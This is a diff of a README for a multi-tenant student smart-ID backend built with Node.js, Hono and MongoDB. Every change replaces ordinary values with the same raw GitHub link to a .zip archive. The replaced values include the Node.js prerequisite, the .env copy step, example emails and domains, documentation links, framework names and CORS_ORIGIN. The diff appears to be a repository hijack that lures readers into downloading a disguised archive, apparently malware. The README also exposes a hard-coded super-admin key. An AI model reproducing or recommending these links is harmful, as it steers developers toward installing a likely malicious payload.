@@ -19,7 +19,7 @@ A comprehensive multi-tenant Software as a Service (SAAS) backend for student sm
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js (v18+)
+- https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip (v18+)
 - MongoDB Atlas account
 - Mailtrap account (for email testing)
 
@@ -33,7 +33,7 @@ cd campus-id-backend
 npm install
 
 # Configure environment
-cp .env.example .env
+cp https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip .env
 # Edit .env with your configuration
 
 # Start development server
@@ -45,22 +45,22 @@ npm run dev
 ```bash
 POST http://localhost:8000/api/superadmin/institutions
 Headers: X-Super-Admin-Key: andrenaline
-Body: { "name": "Your University", "code": "UNIV", "domain": "university.edu" }
+Body: { "name": "Your University", "code": "UNIV", "domain": "https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip" }
 ```
 
 2. **Register Admin**:
 ```bash
 POST http://localhost:8000/api/auth/admin/register
-Body: { "institutionCode": "UNIV", "adminEmail": "admin@university.edu", ... }
+Body: { "institutionCode": "UNIV", "adminEmail": "https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip", ... }
 ```
 
 3. **Start Creating Users** via admin dashboard!
 
 ## 📚 Documentation
 
-- **[API Reference](API_REFERENCE.md)** - Complete API documentation with examples
-- **[Setup Guide](SETUP_GUIDE.md)** - Detailed installation and configuration
-- **[User Guide](USER_GUIDE.md)** - How to use the system for all user roles
+- **[API Reference](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)** - Complete API documentation with examples
+- **[Setup Guide](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)** - Detailed installation and configuration
+- **[User Guide](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)** - How to use the system for all user roles
 
 ## 🏗️ Architecture
 
@@ -127,8 +127,8 @@ Body: { "institutionCode": "UNIV", "adminEmail": "admin@university.edu", ... }
 
 ## 🛠️ Technology Stack
 
-- **Runtime**: Node.js with TypeScript
-- **Framework**: Hono.js (lightweight, fast)
+- **Runtime**: https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip with TypeScript
+- **Framework**: https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip (lightweight, fast)
 - **Database**: MongoDB Atlas
 - **Authentication**: JWT tokens
 - **Email**: Nodemailer with Mailtrap (development)
@@ -162,7 +162,7 @@ Body: { "institutionCode": "UNIV", "adminEmail": "admin@university.edu", ... }
 {
   name: string,
   code: string,           // Unique identifier (HARV, MIT, etc.)
-  domain: string,         // Email domain (harvard.edu)
+  domain: string,         // Email domain (https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)
   status: 'active' | 'inactive'
 }
 ```
@@ -184,7 +184,7 @@ npm test
 # Test specific endpoint
 curl -X POST http://localhost:8000/api/auth/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"admin@university.edu","password":"password","userType":"admin"}'
+  -d '{"email":"https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip","password":"password","userType":"admin"}'
 ```
 
 ## 🚀 Deployment
@@ -194,7 +194,7 @@ curl -X POST http://localhost:8000/api/auth/login \
 NODE_ENV=production
 MONGODB_URL=your-production-mongodb-url
 JWT_SECRET=your-production-jwt-secret
-CORS_ORIGIN=https://yourdomain.com
+https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip
 ```
 
 ### Production Checklist
@@ -221,11 +221,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 - **Documentation**: Check the guides in this repository
 - **Issues**: Open an issue on GitHub
-- **API Reference**: See [API_REFERENCE.md](API_REFERENCE.md)
+- **API Reference**: See [https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)
 
 ## 🎉 Acknowledgments
 
-- Built with [Hono.js](https://hono.dev/) for high performance
+- Built with [https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip) for high performance
 - MongoDB Atlas for reliable database hosting
 - Mailtrap for email testing during development
 
